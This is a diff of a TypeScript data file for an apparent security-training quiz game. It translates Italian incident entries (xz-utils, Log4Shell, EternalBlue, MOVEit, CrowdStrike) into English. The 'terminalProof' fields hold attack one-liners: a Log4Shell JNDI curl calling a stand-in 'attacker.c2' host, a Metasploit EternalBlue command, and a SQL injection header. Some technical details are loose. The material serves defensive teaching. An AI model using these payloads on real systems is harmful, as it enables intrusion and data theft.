@@ -41,7 +41,7 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
     targetArchitecture: 'OpenSSH (sshd) via liblzma on Debian/Fedora',
     severity: 'MAXIMUM DEFCON',
     cvssScore: 10.0,
-    scenario: 'Un backdoor sofisticato iniettato nell\'infrastruttura di build di xz-utils aggancia `RSA_public_decrypt` in OpenSSH tramite GNU indirect function (IFUNC) per intercettare l\'autenticazione ed eseguire codice arbitrario non autenticato prima di sshd.',
+    scenario: 'A sophisticated backdoor injected into the xz-utils build infrastructure hooks `RSA_public_decrypt` in OpenSSH via GNU indirect function (IFUNC) to hijack authentication and execute unauthenticated arbitrary code before sshd reaches login.',
     codeLanguage: 'c',
     vulnerableLineNumber: 4,
     vulnerableCodeSnippet: `// xz-utils m4 macro injection hook
@@ -51,38 +51,38 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
 4:   void **rsa_func = (void**)dlsym(handle, "RSA_public_decrypt");
 5:   if (rsa_func) *rsa_func = (void*)&backdoor_magic_payload_exec;
 6: }`,
-    prompt: 'Quale tecnica ha consentito al backdoor di alterare il flusso di autenticazione OpenSSH senza modificare direttamente il codice sorgente di sshd?',
+    prompt: 'Which technique allowed the backdoor to modify OpenSSH authentication flow without altering sshd source code directly?',
     options: [
       {
         id: 'xz_1',
-        text: 'Aggancio IFUNC resolver durante il linking dinamico systemd-notify in sshd',
+        text: 'Hooking IFUNC resolver during systemd-notify dynamic linking in sshd',
         isCorrect: true,
-        mitigation: 'Rimuovere dipendenze esterne di pre-linking da sshd e compilare solo pacchetti verificati.'
+        mitigation: 'Eliminate external pre-linking dependencies from sshd and audit upstream source tarballs.'
       },
       {
         id: 'xz_2',
-        text: 'Iniezione di un driver kernel via DKMS all\'avvio del server',
+        text: 'Injecting a DKMS kernel driver at server boot time',
         isCorrect: false,
-        mitigation: 'Non applicabile: l\'attacco avviene a livello user-mode ld.so.'
+        mitigation: 'Not applicable: the attack executes entirely within user-mode dynamic linker ld.so.'
       },
       {
         id: 'xz_3',
-        text: 'Sfruttamento di un buffer overflow classico nello stack di ssh-keygen',
+        text: 'Exploiting a traditional stack buffer overflow in ssh-keygen',
         isCorrect: false,
-        mitigation: 'Non è un buffer overflow ma una supply chain code injection.'
+        mitigation: 'This is a multi-stage supply chain injection, not a memory buffer overflow.'
       },
       {
         id: 'xz_4',
-        text: 'Bypass del firewall iptables tramite pacchetti GRE incapsulati',
+        text: 'Bypassing iptables firewalls via encapsulated GRE frames',
         isCorrect: false,
-        mitigation: 'La vulnerabilità risiede nella crittografia RSA applicativa, non nel layer di rete.'
+        mitigation: 'The vulnerability targets application-layer RSA verification, not network encapsulation.'
       }
     ],
     rootCauseAnalysis: {
       cwe: 'CWE-506: Embedded Malicious Code (Supply Chain Attack)',
-      attackVector: 'Script M4 nel tarball di release modificavano il build stage iniettando codice oggetto offuscato nei file di test .lzma.',
-      historicalImpact: 'Avrebbe compromesso l\'accesso root SSH a milioni di server Linux mondiali se non fosse stato individuato dall\'ingegnere Andres Freund per una latenza anomala di 500ms.',
-      remediationPatch: 'Rollback immediato a xz-utils 5.4.x e rimozione del linking a libsystemd nei binari OpenSSH.',
+      attackVector: 'M4 macros in release tarballs altered build stages to inject obfuscated object code into test .lzma files.',
+      historicalImpact: 'Would have granted unauthorized root SSH access to millions of Linux servers worldwide if not spotted by engineer Andres Freund due to a 500ms latency anomaly.',
+      remediationPatch: 'Immediate rollback to xz-utils 5.4.x and removal of libsystemd linking from OpenSSH binaries.',
       terminalProof: '$ ssh -i id_rsa -o "CertificateInvalid=..." target-server\n[DEBUG] Backdoor signature payload triggered: root shell spawned'
     },
     xpReward: 80,
@@ -97,47 +97,47 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
     targetArchitecture: 'Apache Log4j 2.x Java Application Framework',
     severity: 'MAXIMUM DEFCON',
     cvssScore: 10.0,
-    scenario: 'Log4j valuta ricorsivamente le espressioni all\'interno dei messaggi registrati. Se un log contiene la stringa `${jndi:ldap://...}`, Log4j effettua una query LDAP remota scaricando e caricando dinamicamente una classe Java non attendibile.',
+    scenario: 'Log4j recursively evaluates expressions inside logged messages. When a log statement contains `${jndi:ldap://...}`, Log4j queries the remote LDAP server, downloading and dynamically executing an untrusted Java class.',
     codeLanguage: 'java',
     vulnerableLineNumber: 3,
-    vulnerableCodeSnippet: `// Controller di login applicativo Java Spring Boot
+    vulnerableCodeSnippet: `// Spring Boot Java Login Controller
 1: @PostMapping("/login")
 2: public ResponseEntity<?> login(@RequestHeader("User-Agent") String userAgent) {
-3:     logger.info("Tentativo di accesso ricevuto da browser: {}", userAgent);
-4:     return ResponseEntity.ok("Handshake in corso");
+3:     logger.info("Login attempt received from client: {}", userAgent);
+4:     return ResponseEntity.ok("Handshake in progress");
 5: }`,
-    prompt: 'Quale parametro del runtime JVM blocca l\'esecuzione di codice remoto scaricato via JNDI/LDAP come workaround immediato?',
+    prompt: 'Which JVM runtime flag mitigates remote code execution via JNDI/LDAP as an immediate emergency workaround?',
     options: [
       {
         id: 'l4j_1',
-        text: '-Dlog4j2.formatMsgNoLookups=true oppure eliminazione di JndiLookup.class',
+        text: '-Dlog4j2.formatMsgNoLookups=true or removing JndiLookup.class',
         isCorrect: true,
-        mitigation: 'Disabilita la risoluzione delle lookup JNDI nei formati dei messaggi di log.'
+        mitigation: 'Disables message lookups in log formats, preventing outbound JNDI queries.'
       },
       {
         id: 'l4j_2',
-        text: '-Xmx4096m per allocare maggiore memoria heap al garbage collector',
+        text: '-Xmx4096m to allocate additional heap memory to the garbage collector',
         isCorrect: false,
-        mitigation: 'Aumentare la RAM non previene l\'iniezione di classi remote.'
+        mitigation: 'Increasing memory allocation does not prevent remote class injection.'
       },
       {
         id: 'l4j_3',
-        text: 'Impostare HTTP Strict Transport Security (HSTS) a 31536000 secondi',
+        text: 'Setting HTTP Strict Transport Security (HSTS) to 31536000 seconds',
         isCorrect: false,
-        mitigation: 'HSTS protegge il browser ma il payload colpisce il backend parser.'
+        mitigation: 'HSTS secures browser connections but does not sanitize backend log parsing.'
       },
       {
         id: 'l4j_4',
-        text: 'Riavvio di Tomcat con permessi chmod 777 su /opt/tomcat',
+        text: 'Restarting Tomcat with chmod 777 permissions on /opt/tomcat',
         isCorrect: false,
-        mitigation: 'Chmod 777 aumenta gravemente la superficie di attacco locale.'
+        mitigation: 'Chmod 777 severely weakens local system security posture.'
       }
     ],
     rootCauseAnalysis: {
       cwe: 'CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement',
-      attackVector: 'String injection in header HTTP (User-Agent, X-Forwarded-For) o form inputs registrati dal logger.',
-      historicalImpact: 'Ha impattato oltre l\'80% dell\'ecosistema enterprise Java globale (Apple, Amazon AWS, Steam, VMware).',
-      remediationPatch: 'Aggiornamento obbligatorio a Log4j 2.17.1+ e rimozione del protocollo JNDI dai formati di default.',
+      attackVector: 'String injection in HTTP headers (User-Agent, X-Forwarded-For) or input forms processed by logger.',
+      historicalImpact: 'Impacted over 80% of global enterprise Java infrastructure (Apple, Amazon AWS, Steam, VMware).',
+      remediationPatch: 'Mandatory upgrade to Log4j 2.17.1+ and disabling JNDI protocols by default.',
       terminalProof: '$ curl -H "User-Agent: \${jndi:ldap://attacker.c2/Exploit.class}" https://target.corp/\n[+] LDAP query received on port 1389: Payload delivered!'
     },
     xpReward: 80,
@@ -152,48 +152,48 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
     targetArchitecture: 'Windows SMBv1 Server Kernel Driver (srv.sys)',
     severity: 'MAXIMUM DEFCON',
     cvssScore: 9.8,
-    scenario: 'Una discrepanza tra casting matematico a 16 e 32 bit nella gestione del comando SMB_COM_TRANSACTION2_SECONDARY provoca un buffer overflow nel pool di memoria non di paging del kernel Windows (srv.sys), permettendo RCE con privilegi SYSTEM.',
+    scenario: 'A discrepancy between 16-bit and 32-bit mathematical casting in handling SMB_COM_TRANSACTION2_SECONDARY triggers a buffer overflow in the Windows kernel non-paged pool (srv.sys), granting SYSTEM-level RCE.',
     codeLanguage: 'c',
     vulnerableLineNumber: 4,
     vulnerableCodeSnippet: `// SrvOs2FeaListSizeToNt() in srv.sys
 1: ULONG SrvOs2FeaListSizeToNt(PFEALIST FeaList) {
-2:   // Errore di overflow aritmetico nella conversione della lista attributi
+2:   // Integer overflow in extended attribute list conversion
 3:   USHORT listSize = FeaList->cbList;
 4:   ULONG calculatedSize = (ULONG)listSize + 0x1000; // Integer Wrap-around!
 5:   return calculatedSize;
 6: }`,
-    prompt: 'Quale misura architetturale a livello di networking e di sistema operativo elimina alla radice la superficie di attacco di EternalBlue?',
+    prompt: 'Which architectural network and OS configuration completely eliminates the EternalBlue attack surface?',
     options: [
       {
         id: 'eb_1',
-        text: 'Disabilitazione permanente di SMBv1 e blocco perimetrale delle porte TCP 445 e 139',
+        text: 'Permanently disabling SMBv1 and blocking inbound TCP ports 445 and 139 at the perimeter',
         isCorrect: true,
-        mitigation: 'SMBv1 è un protocollo deprecato risalente agli anni 80; usare solo SMBv3 crittografato.'
+        mitigation: 'SMBv1 is an obsolete protocol; enforce modern encrypted SMBv3 only.'
       },
       {
         id: 'eb_2',
-        text: 'Attivazione di Windows Defender Real-time Cloud Protection su porta 80',
+        text: 'Enabling Windows Defender Cloud Protection on port 80',
         isCorrect: false,
-        mitigation: 'L\'attacco colpisce il kernel SMB su porta 445, non la porta web 80.'
+        mitigation: 'The exploit targets kernel SMB on port 445, not port 80.'
       },
       {
         id: 'eb_3',
-        text: 'Abilitazione di NTLMv1 al posto di Kerberos nel Domain Controller',
+        text: 'Enabling NTLMv1 instead of Kerberos on Domain Controllers',
         isCorrect: false,
-        mitigation: 'NTLMv1 è insicuro e non correlato al bug di pool allocation in srv.sys.'
+        mitigation: 'NTLMv1 is insecure and unrelated to memory corruption in srv.sys.'
       },
       {
         id: 'eb_4',
-        text: 'Aumento della subnet mask da /24 a /16 per isolare il gateway',
+        text: 'Broadening the subnet mask from /24 to /16 to isolate the gateway',
         isCorrect: false,
-        mitigation: 'Allargare la subnet estende la propagazione dei worm wormable.'
+        mitigation: 'Expanding subnet size facilitates self-propagating wormable malware spread.'
       }
     ],
     rootCauseAnalysis: {
       cwe: 'CWE-190: Integer Overflow or Wraparound in Kernel Driver',
-      attackVector: 'Invio di pacchetti SMBv1 malformati contenenti attributi estesi (FEA List) calcolati in modo incoerente.',
-      historicalImpact: 'Ha alimentato il ransomware WannaCry e NotPetya, causando miliardi di dollari di danni ospedalieri e industriali.',
-      remediationPatch: 'Installazione della patch Microsoft MS17-010 e rimozione della feature Windows `SMB1Protocol`.',
+      attackVector: 'Malformed SMBv1 frames containing extended attributes (FEA List) with inconsistent sizes.',
+      historicalImpact: 'Fueled the WannaCry and NotPetya ransomware pandemics, generating billions in global hospital and supply chain damages.',
+      remediationPatch: 'Install Microsoft security bulletin MS17-010 and disable the `SMB1Protocol` Windows feature.',
       terminalProof: '$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; run"\n[+] Meterpreter session 1 opened (NT AUTHORITY\\SYSTEM)'
     },
     xpReward: 85,
@@ -208,7 +208,7 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
     targetArchitecture: 'Progress MOVEit Transfer Web App (.NET / MySQL)',
     severity: 'CRITICAL',
     cvssScore: 9.8,
-    scenario: 'Un parametro HTTP non sanitizzato nell\'endpoint `guestaccess.aspx` consentiva un\'SQL Injection pre-autenticazione. Gli aggressori hanno alterato la sessione del database per impersonare l\'amministratore e caricare un webshell stealth (`human2.aspx`).',
+    scenario: 'An unsanitized HTTP header parameter in `guestaccess.aspx` enabled pre-authentication SQL Injection. Attackers altered session state to impersonate admin privileges and drop a stealth webshell (`human2.aspx`).',
     codeLanguage: 'csharp',
     vulnerableLineNumber: 3,
     vulnerableCodeSnippet: `// guestaccess.aspx handler in MOVEit.DMZ.ClassLib
@@ -218,38 +218,38 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
 4:     MySqlCommand cmd = new MySqlCommand(query, conn);
 5:     MySqlDataReader reader = cmd.ExecuteReader();
 6: }`,
-    prompt: 'Quale principio di programmazione difensiva avrebbe impedito l\'esecuzione del payload SQL nell\'endpoint guestaccess.aspx?',
+    prompt: 'Which defensive programming principle would have prevented SQL payload execution in guestaccess.aspx?',
     options: [
       {
         id: 'mov_1',
-        text: 'Adozione rigorosa di Prepared Statements con parametri tipizzati (MySqlParameter)',
+        text: 'Strict use of Prepared Statements with strongly-typed parameters (MySqlParameter)',
         isCorrect: true,
-        mitigation: 'I parametri vincolano l\'input al tipo di dato, impedendo a apici e commenti SQL di alterare l\'albero AST della query.'
+        mitigation: 'Parameterized queries bind data to defined types, preventing quotes and SQL syntax hijacking.'
       },
       {
         id: 'mov_2',
-        text: 'Cifratura del database con BitLocker a livello di volume disco',
+        text: 'Encrypting the database disk volume with BitLocker',
         isCorrect: false,
-        mitigation: 'BitLocker protegge da furto fisico del disco, non dalle query malevole inviate al demone attivo.'
+        mitigation: 'BitLocker protects against physical disk theft, not online application-layer queries.'
       },
       {
         id: 'mov_3',
-        text: 'Utilizzo di certificati autofirmati TLS con hash MD5',
+        text: 'Deploying self-signed TLS certificates signed with MD5 hashes',
         isCorrect: false,
-        mitigation: 'MD5 è insicuro e il layer TLS trasporta inalterato il payload applicativo SQLi.'
+        mitigation: 'MD5 is insecure and TLS transports SQL injection payloads unmodified.'
       },
       {
         id: 'mov_4',
-        text: 'Rimozione dei cookie di sessione da parte del load balancer',
+        text: 'Stripping session cookies at the reverse proxy load balancer',
         isCorrect: false,
-        mitigation: 'Il bug era pre-autenticazione e non richiedeva cookie preesistenti.'
+        mitigation: 'This vulnerability was pre-authentication and did not rely on pre-existing session cookies.'
       }
     ],
     rootCauseAnalysis: {
       cwe: 'CWE-89: SQL Injection in Unauthenticated Web Handlers',
-      attackVector: 'Iniezione di payload SQL tramite header HTTP custom `X-siLock-Transaction` manipolati.',
-      historicalImpact: 'Esfiltrazione massiva di dati da centinaia di banche, governi ed enti previdenziali in tutto il mondo.',
-      remediationPatch: 'Sanitizzazione obbligatoria degli header e migrazione completa a query parametrizzate in C# Entity Framework.',
+      attackVector: 'Injecting SQL statements through user-controllable `X-siLock-Transaction` HTTP headers.',
+      historicalImpact: 'Mass data exfiltration impacting hundreds of financial institutions, government agencies, and pension funds worldwide.',
+      remediationPatch: 'Mandatory header sanitization and complete migration to parameterized queries in Entity Framework.',
       terminalProof: '$ curl -H "X-siLock-Transaction: 1\' OR 1=1--" https://transfer.corp/guestaccess.aspx\nHTTP/1.1 200 OK (Admin Session Token Forged)'
     },
     xpReward: 80,
@@ -264,48 +264,48 @@ export const DAILY_BREACHES: DailyBreachIncident[] = [
     targetArchitecture: 'CSAgent.sys Kernel Driver on Windows 10/11 & Server',
     severity: 'MAXIMUM DEFCON',
     cvssScore: 9.9,
-    scenario: 'Il sensore kernel Falcon ha ricevuto il file di configurazione `Channel File 291` contenente 21 campi logici non inizializzati. Il driver `CSAgent.sys` ha tentato di dereferenziare un puntatore nullo a memoria non mappata, innescando una bugcheck PAGE_FAULT_IN_NONPAGED_AREA (BSOD globale).',
+    scenario: 'The Falcon kernel sensor received `Channel File 291` containing 21 uninitialized logic fields. The `CSAgent.sys` driver dereferenced a null pointer into unmapped memory, triggering a PAGE_FAULT_IN_NONPAGED_AREA bugcheck (global BSOD).',
     codeLanguage: 'c',
     vulnerableLineNumber: 4,
     vulnerableCodeSnippet: `// CSAgent.sys Named Pipe Parser Routine
 1: NTSTATUS EvaluateChannelRules(PCHANNEL_PACKET Packet) {
 2:   PRULE_ENTRY Entry = Packet->RuleTable[Packet->ActiveRuleIndex];
-3:   // Mancata verifica di puntatore valido prima dell'ispezione
+3:   // Missing pointer sanity check before member access
 4:   ULONG signatureId = Entry->SignaturePointer->Id; // NULL POINTER DEREFERENCE!
 5:   return ProcessSignature(signatureId);
 6: }`,
-    prompt: 'Quale test architetturale di Quality Assurance nel kernel ring-0 previene crash globali da Channel File updates?',
+    prompt: 'Which ring-0 kernel Quality Assurance testing methodology prevents widespread outages from dynamic content updates?',
     options: [
       {
         id: 'cs_1',
-        text: 'Validazione formale degli schemi di input e staged canary deployment ring-based',
+        text: 'Formal schema input validation and staged ring-based canary deployments',
         isCorrect: true,
-        mitigation: 'Rilasciare gli update a ondate (canary rings 0 -> 1 -> 2) e verificare i bounds nel parser driver.'
+        mitigation: 'Roll out channel updates in progressive rings (0 -> 1 -> 2) and enforce bounds checking in driver parsers.'
       },
       {
         id: 'cs_2',
-        text: 'Esecuzione dei driver antivirus in modalità utente tramite interprete Python',
+        text: 'Executing antivirus device drivers in user mode via Python interpreters',
         isCorrect: false,
-        mitigation: 'I sensori EDR necessitano di hook ring-0 kernel per monitorare chiamate syscall native.'
+        mitigation: 'EDR sensors require ring-0 hooks to monitor native syscalls in real time.'
       },
       {
         id: 'cs_3',
-        text: 'Disabilitazione del Safe Mode su tutte le macchine Windows Server',
+        text: 'Disabling Safe Mode across all enterprise Windows Server fleets',
         isCorrect: false,
-        mitigation: 'Il Safe Mode è stato l\'unico meccanismo che ha permesso di eliminare manualmente il file corrotto.'
+        mitigation: 'Safe Mode was the primary mechanism allowing administrators to manually delete the offending channel file.'
       },
       {
         id: 'cs_4',
-        text: 'Compilazione del driver kernel disabilitando i controlli di integrità WHQL',
+        text: 'Compiling kernel drivers without WHQL code signing integrity checks',
         isCorrect: false,
-        mitigation: 'WHQL garantisce la firma digitale di Microsoft e l\'integrità del codice kernel.'
+        mitigation: 'WHQL validates Microsoft code signing and kernel image integrity.'
       }
     ],
     rootCauseAnalysis: {
       cwe: 'CWE-476: NULL Pointer Dereference in Ring-0 Device Driver',
-      attackVector: 'Distribuzione di content update dinamico privo di validazione semantica su milioni di endpoint enterprise.',
-      historicalImpact: '8.5 milioni di computer Windows bloccati in boot loop (aeroporti, ospedali, banche, media televisivi).',
-      remediationPatch: 'Controllo esplicito `if (!Entry || !Entry->SignaturePointer) return STATUS_INVALID_DATA;` e roll-out a cluster progressivi.',
+      attackVector: 'Dynamic distribution of unvalidated configuration content files to millions of enterprise endpoints simultaneously.',
+      historicalImpact: '8.5 million Windows machines disabled in boot loops, grounding flights and disrupting healthcare facilities worldwide.',
+      remediationPatch: 'Explicit verification `if (!Entry || !Entry->SignaturePointer) return STATUS_INVALID_DATA;` and staggered deployment waves.',
       terminalProof: 'CRITICAL_PROCESS_DIED: BugCheck 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)\nArguments: ffff800000000000, 0000000000000000, fffff8012a4f1020, 0000000000000002'
     },
     xpReward: 85,
@@ -339,15 +339,14 @@ export function generateDailyBreachShareCard(
   userElo: number
 ): string {
   const dateStr = new Date().toISOString().slice(0, 10);
-  const resultIcon = isCorrect ? '🟩' : '🟥';
-  const streakFires = '🔥'.repeat(Math.min(5, Math.max(1, currentStreak)));
+  const statusTag = isCorrect ? '[PASS]' : '[FAIL]';
 
-  return `🛡️ ZeroDay (0xDAY) // Daily 0xBreach #${incident.dayIndex}
-📅 ${dateStr} · ${incident.cveId}
-${resultIcon} Triage: ${isCorrect ? 'SUCCESS' : 'BREACH DETECTED'} (${secondsTaken.toFixed(1)}s)
-${streakFires} Daily Incident Streak: ${currentStreak} giorni
-⚡ ELO Operativo: ${userElo}
+  return `[ZeroDay] // Daily 0xBreach #${incident.dayIndex}
+Date: ${dateStr} · ${incident.cveId}
+${statusTag} Triage: ${isCorrect ? 'SUCCESS' : 'BREACH DETECTED'} (${secondsTaken.toFixed(1)}s)
+Daily Incident Streak: ${currentStreak} days
+Operational ELO: ${userElo}
 
-Riuscirai a mitigare l'attacco di oggi prima di me?
-👉 https://zeroday.gg`;
+Can you mitigate today's attack faster than me?
+URL: https://zeroday.gg`;
 }
